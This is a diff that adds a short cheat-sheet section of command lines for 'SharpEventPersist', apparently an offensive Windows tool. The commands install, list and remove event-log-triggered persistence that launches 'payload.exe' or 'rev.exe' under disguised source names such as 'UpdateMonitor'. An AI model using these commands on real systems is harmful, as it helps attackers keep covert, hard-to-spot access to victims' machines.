@@ -1,0 +1,12 @@
+# ================= SharpEventPersist =================
+# Create event log persistence using a custom event trigger
+SharpEventPersist.exe --install --log-name Security --source-name UpdateMonitor --command "C:\Tools\payload.exe"
+
+# Remove persistence by specifying log and source
+SharpEventPersist.exe --remove --log-name Security --source-name UpdateMonitor
+
+# List existing event log persistence entries
+SharpEventPersist.exe --list
+
+# Use verbose output to debug persistence setup
+SharpEventPersist.exe --install --log-name System --source-name ServiceChecker --command "C:\Tools\rev.exe" --verbose
